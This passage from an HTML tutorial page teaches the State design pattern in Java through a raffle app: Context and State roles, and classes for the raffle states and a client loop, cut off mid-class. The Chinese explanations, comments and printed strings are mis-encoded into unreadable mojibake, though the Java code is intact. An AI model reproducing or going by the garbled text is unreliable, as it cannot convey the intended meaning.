æ–°çš„çŠ¶æ€ç±»éœ€è¦ä¿®æ”¹é‚£äº›è´Ÿè´£çŠ¶æ€è½¬æ¢çš„æºä»£ç ï¼Œå¦åˆ™æ— æ³•åˆ‡æ¢åˆ°æ–°å¢çŠ¶æ€ï¼Œè€Œä¸”ä¿®æ”¹æŸä¸ªçŠ¶æ€ç±»çš„è¡Œä¸ºä¹Ÿéœ€ä¿®æ”¹å¯¹åº”ç±»çš„æºä»£ç ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> 1ã€è¡Œä¸ºéšçŠ¶æ€æ”¹å˜è€Œæ”¹å˜çš„åœºæ™¯ã€‚ 2ã€æ¡ä»¶ã€åˆ†æ”¯è¯­å¥çš„ä»£æ›¿è€…ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> åœ¨è¡Œä¸ºå—çŠ¶æ€çº¦æŸçš„æ—¶å€™ä½¿ç”¨çŠ¶æ€æ¨¡å¼ï¼Œè€Œä¸”çŠ¶æ€ä¸è¶…è¿‡ 5 ä¸ªã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105110507630.png" alt="image-20230105110507630" /></p><p>å¯¹åŸç†ç±»å›¾çš„è¯´æ˜-å³(çŠ¶æ€æ¨¡å¼çš„è§’è‰²åŠèŒè´£)</p><ol><li><p>Context ç±»ä¸ºç¯å¢ƒè§’è‰², ç”¨äºç»´æŠ¤ State å®ä¾‹,è¿™ä¸ªå®ä¾‹å®šä¹‰å½“å‰çŠ¶æ€</p></li><li><p>State æ˜¯æŠ½è±¡çŠ¶æ€è§’è‰²,å®šä¹‰ä¸€ä¸ªæ¥å£å°è£…ä¸ Context çš„ä¸€ä¸ªç‰¹ç‚¹æ¥å£ç›¸å…³è¡Œä¸º</p></li><li><p>ConcreteState å…·ä½“çš„çŠ¶æ€è§’è‰²ï¼Œæ¯ä¸ªå­ç±»å®ç°ä¸€ä¸ªä¸ Context çš„ä¸€ä¸ªçŠ¶æ€ç›¸å…³è¡Œä¸º</p></li></ol><h2 id="å®ç°-18"><a class="markdownIt-Anchor" href="#å®ç°-18"></a> å®ç°</h2><h3 id="çŠ¶æ€æ¨¡å¼è§£å†³-app-æŠ½å¥–é—®"><a class="markdownIt-Anchor" href="#çŠ¶æ€æ¨¡å¼è§£å†³-app-æŠ½å¥–é—®"></a> çŠ¶æ€æ¨¡å¼è§£å†³ APP æŠ½å¥–é—®</h3><ol><li>åº”ç”¨å®ä¾‹è¦æ±‚</li></ol><p>â€‹1) å‡å¦‚æ¯å‚åŠ ä¸€æ¬¡è¿™ä¸ªæ´»åŠ¨è¦æ‰£é™¤ç”¨æˆ· 50 ç§¯åˆ†ï¼Œä¸­å¥–æ¦‚ç‡æ˜¯ 10%</p><p>â€‹2) å¥–å“æ•°é‡å›ºå®šï¼ŒæŠ½å®Œå°±ä¸èƒ½æŠ½å¥–</p><p>â€‹3) æ´»åŠ¨æœ‰å››ä¸ªçŠ¶æ€: å¯ä»¥æŠ½å¥–ã€ä¸èƒ½æŠ½å¥–ã€å‘æ”¾å¥–å“å’Œå¥–å“é¢†å®Œ</p><p>â€‹4) æ´»åŠ¨çš„å››ä¸ªçŠ¶æ€è½¬æ¢å…³ç³»å›¾(å³å›¾)</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105110700473.png" alt="image-20230105110700473" /></p><p>å®Œæˆ APP æŠ½å¥–æ´»åŠ¨é¡¹ç›®ï¼Œä½¿ç”¨çŠ¶æ€æ¨¡å¼.</p><ol start="2"><li>æ€è·¯åˆ†æå’Œå›¾è§£(ç±»å›¾)</li></ol><p>-å®šä¹‰å‡ºä¸€ä¸ªæ¥å£å«çŠ¶æ€æ¥å£ï¼Œæ¯ä¸ªçŠ¶æ€éƒ½å®ç°å®ƒã€‚</p><p>-æ¥å£æœ‰æ‰£é™¤ç§¯åˆ†æ–¹æ³•ã€æŠ½å¥–æ–¹æ³•ã€å‘æ”¾å¥–å“æ–¹æ³•</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105140413812.png" alt="image-20230105140413812" /></p><p><code>CanRaffleState.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state;<br><br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * å¯ä»¥æŠ½å¥–çš„çŠ¶æ€</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CanRaffleState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">State</span> &#123;<br><br>    RaffleActivity activity;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CanRaffleState</span><span class="hljs-params">(RaffleActivity activity)</span> &#123;<br>        <span class="hljs-built_in">this</span>.activity = activity;<br>    &#125;<br><br>    <span class="hljs-comment">//å·²ç»æ‰£é™¤äº†ç§¯åˆ†ï¼Œä¸èƒ½å†æ‰£</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deductMoney</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;å·²ç»æ‰£å–è¿‡äº†ç§¯åˆ†&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//å¯ä»¥æŠ½å¥–, æŠ½å®Œå¥–åï¼Œæ ¹æ®å®é™…æƒ…å†µï¼Œæ”¹æˆæ–°çš„çŠ¶æ€</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">raffle</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ­£åœ¨æŠ½å¥–ï¼Œè¯·ç¨ç­‰ï¼&quot;</span>);<br>        <span class="hljs-type">Random</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> r.nextInt(<span class="hljs-number">10</span>);<br>        <span class="hljs-comment">// 10%ä¸­å¥–æœºä¼š</span><br>        <span class="hljs-keyword">if</span>(num == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-comment">// æ”¹å˜æ´»åŠ¨çŠ¶æ€ä¸ºå‘æ”¾å¥–å“ context</span><br>            activity.setState(activity.getDispenseState());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;å¾ˆé—æ†¾æ²¡æœ‰æŠ½ä¸­å¥–å“ï¼&quot;</span>);<br>            <span class="hljs-comment">// æ”¹å˜çŠ¶æ€ä¸ºä¸èƒ½æŠ½å¥–</span><br>            activity.setState(activity.getNoRafflleState());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// ä¸èƒ½å‘æ”¾å¥–å“</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispensePrize</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ²¡ä¸­å¥–ï¼Œä¸èƒ½å‘æ”¾å¥–å“&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * çŠ¶æ€æ¨¡å¼æµ‹è¯•ç±»</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">// åˆ›å»ºæ´»åŠ¨å¯¹è±¡ï¼Œå¥–å“æœ‰1ä¸ªå¥–å“</span><br>        <span class="hljs-type">RaffleActivity</span> <span class="hljs-variable">activity</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RaffleActivity</span>(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">// æˆ‘ä»¬è¿ç»­æŠ½30æ¬¡å¥–</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30</span>; i++) &#123;<br>            System.out.println(<span class="hljs-string">&quot;--------ç¬¬&quot;</span> + (i + <span class="hljs-number">1</span>) + <span class="hljs-string">&quot;æ¬¡æŠ½å¥–----------&quot;</span>);<br>            <span class="hljs-comment">// å‚åŠ æŠ½å¥–ï¼Œç¬¬ä¸€æ­¥ç‚¹å‡»æ‰£é™¤ç§¯åˆ†</span><br>            activity.debuctMoney();<br><br>            <span class="hljs-comment">// ç¬¬äºŒæ­¥æŠ½å¥–</span><br>            activity.raffle();<br>        &#125;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>DispenseOutState.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * å¥–å“å‘æ”¾å®Œæ¯•çŠ¶æ€</span><br><span class="hljs-comment"> * è¯´æ˜ï¼Œå½“æˆ‘ä»¬activity æ”¹å˜æˆ DispenseOutStateï¼Œ æŠ½å¥–æ´»åŠ¨ç»“æŸ</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispenseOutState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">State</span> &#123;<br><br>   <span class="hljs-comment">// åˆå§‹åŒ–æ—¶ä¼ å…¥æ´»åŠ¨å¼•ç”¨</span><br>    RaffleActivity activity;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DispenseOutState</span><span class="hljs-params">(RaffleActivity activity)</span> &#123;<br>        <span class="hljs-built_in">this</span>.activity = activity;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deductMoney</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;å¥–å“å‘é€å®Œäº†ï¼Œè¯·ä¸‹æ¬¡å†å‚åŠ &quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">raffle</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;å¥–å“å‘é€å®Œäº†ï¼Œè¯·ä¸‹æ¬¡å†å‚åŠ &quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispensePrize</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;å¥–å“å‘é€å®Œäº†ï¼Œè¯·ä¸‹æ¬¡å†å‚åŠ &quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>DispenseState.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * å‘æ”¾å¥–å“çš„çŠ¶æ€</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispenseState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">State</span> &#123;<br><br>    <span class="hljs-comment">// åˆå§‹åŒ–æ—¶ä¼ å…¥æ´»åŠ¨å¼•ç”¨ï¼Œå‘æ”¾å¥–å“åæ”¹å˜å…¶çŠ¶æ€</span><br>    RaffleActivity activity;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DispenseState</span><span class="hljs-params">(RaffleActivity activity)</span> &#123;<br>        <span class="hljs-built_in">this</span>.activity = activity;<br>    &#125;<br>    <br>    <span class="hljs-comment">//</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deductMoney</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¸èƒ½æ‰£é™¤ç§¯åˆ†&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">raffle</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¸èƒ½æŠ½å¥–&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//å‘æ”¾å¥–å“</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispensePrize</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span>(activity.getCount() &gt; <span class="hljs-number">0</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;æ­å–œä¸­å¥–äº†&quot;</span>);<br>            <span class="hljs-comment">// æ”¹å˜çŠ¶æ€ä¸ºä¸èƒ½æŠ½å¥–</span><br>            activity.setState(activity.getNoRafflleState());<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;å¾ˆé—æ†¾ï¼Œå¥–å“å‘é€å®Œäº†&quot;</span>);<br>            <span class="hljs-comment">// æ”¹å˜çŠ¶æ€ä¸ºå¥–å“å‘é€å®Œæ¯•, åé¢æˆ‘ä»¬å°±ä¸å¯ä»¥æŠ½å¥–</span><br>            activity.setState(activity.getDispensOutState());<br>            <span class="hljs-comment">//System.out.println(&quot;æŠ½å¥–æ´»åŠ¨ç»“æŸ&quot;);</span><br>            <span class="hljs-comment">//System.exit(0);</span><br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>NoRaffleState.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * ä¸èƒ½æŠ½å¥–çŠ¶æ€</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NoRaffleState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">State</span> &#123;<br><br>    <span class="hljs-comment">// åˆå§‹åŒ–æ—¶ä¼ å…¥æ´»åŠ¨å¼•ç”¨ï¼Œæ‰£é™¤ç§¯åˆ†åæ”¹å˜å…¶çŠ¶æ€</span><br>    RaffleActivity activity;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">NoRaffleState</span><span class="hljs-params">(RaffleActivity activity)</span> &#123;<br>        <span class="hljs-built_in">this</span>.activity = activity;<br>    &#125;<br><br>    <span class="hljs-comment">// å½“å‰çŠ¶æ€å¯ä»¥æ‰£ç§¯åˆ† , æ‰£é™¤åï¼Œå°†çŠ¶æ€è®¾ç½®æˆå¯ä»¥æŠ½å¥–çŠ¶æ€</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deductMoney</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰£é™¤50ç§¯åˆ†æˆåŠŸï¼Œæ‚¨å¯ä»¥æŠ½å¥–äº†&quot;</span>);<br>        activity.setState(activity.getCanRaffleState());<br>    &#125;<br><br>    <span class="hljs-comment">// å½“å‰çŠ¶æ€ä¸èƒ½æŠ½å¥–</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">raffle</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰£äº†ç§¯åˆ†æ‰èƒ½æŠ½å¥–å–”ï¼&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// å½“å‰çŠ¶æ€ä¸èƒ½å‘å¥–å“</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispensePrize</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¸èƒ½å‘æ”¾å¥–å“&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>RaffleActivity.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * æŠ½å¥–æ´»åŠ¨ //</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RaffleActivity</span> &#123;<br><br>    <span class="hljs-comment">// state è¡¨ç¤ºæ´»åŠ¨å½“å‰çš„çŠ¶æ€ï¼Œæ˜¯å˜åŒ–</span><br>    <span class="hljs-type">State</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">// å¥–å“æ•°é‡</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// å››ä¸ªå±æ€§ï¼Œè¡¨ç¤ºå››ç§çŠ¶æ€</span><br>    <span class="hljs-type">State</span> <span class="hljs-variable">noRafflleState</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoRaffleState</span>(<span class="hljs-built_in">this</span>);<br>    <span class="hljs-type">State</span> <span class="hljs-variable">canRaffleState</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CanRaffleState</span>(<span class="hljs-built_in">this</span>);<br><br>    <span class="hljs-type">State</span> <span class="hljs-variable">dispenseState</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DispenseState</span>(<span class="hljs-built_in">this</span>);<br>    <span class="hljs-type">State</span> <span class="hljs-variable">dispensOutState</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DispenseOutState</span>(<span class="hljs-built_in">this</span>);<br><br>    <span class="hljs-comment">//æ„é€ å™¨</span><br>    <span class="hljs-comment">//1. åˆå§‹åŒ–å½“å‰çš„çŠ¶æ€ä¸º noRafflleStateï¼ˆå³ä¸èƒ½æŠ½å¥–çš„çŠ¶æ€ï¼‰</span><br>    <span class="hljs-comment">//2. åˆå§‹åŒ–å¥–å“çš„æ•°é‡ </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RaffleActivity</span><span class="hljs-params">(<span class="hljs-type">int</span> count)</span> &#123;<br>        <span class="hljs-built_in">this</span>.state = getNoRafflleState();<br>        <span class="hljs-built_in">this</span>.count = count;<br>    &#125;<br><br>    <span class="hljs-comment">//æ‰£åˆ†, è°ƒç”¨å½“å‰çŠ¶æ€çš„ deductMoney</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">debuctMoney</span><span class="hljs-params">()</span> &#123;<br>        state.deductMoney();<br>    &#125;<br><br>    <span class="hljs-comment">//æŠ½å¥– </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">raffle</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// å¦‚æœå½“å‰çš„çŠ¶æ€æ˜¯æŠ½å¥–æˆåŠŸ</span><br>        <span class="hljs-keyword">if</span> (state.raffle()) &#123;<br>            <span class="hljs-comment">//é¢†å–å¥–å“</span><br>            state.dispensePrize();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> State <span class="hljs-title function_">getState</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> state;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setState</span><span class="hljs-params">(State state)</span> &#123;<br>        <span class="hljs-built_in">this</span>.state = state;<br>    &#125;<br><br>    <span class="hljs-comment">//è¿™é‡Œè¯·å¤§å®¶æ³¨æ„ï¼Œæ¯é¢†å–ä¸€æ¬¡å¥–å“ï¼Œcount--</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCount</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">curCount</span> <span class="hljs-operator">=</span> count;<br>        count--;<br>        <span class="hljs-keyword">return</span> curCount;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCount</span><span class="hljs-params">(<span class="hljs-type">int</span> count)</span> &#123;<br>        <span class="hljs-built_in">this</span>.count = count;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> State <span class="hljs-title function_">getNoRafflleState</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> noRafflleState;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNoRafflleState</span><span class="hljs-params">(State noRafflleState)</span> &#123;<br>        <span class="hljs-built_in">this</span>.noRafflleState = noRafflleState;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> State <span class="hljs-title function_">getCanRaffleState</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> canRaffleState;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCanRaffleState</span><span class="hljs-params">(State canRaffleState)</span> &#123;<br>        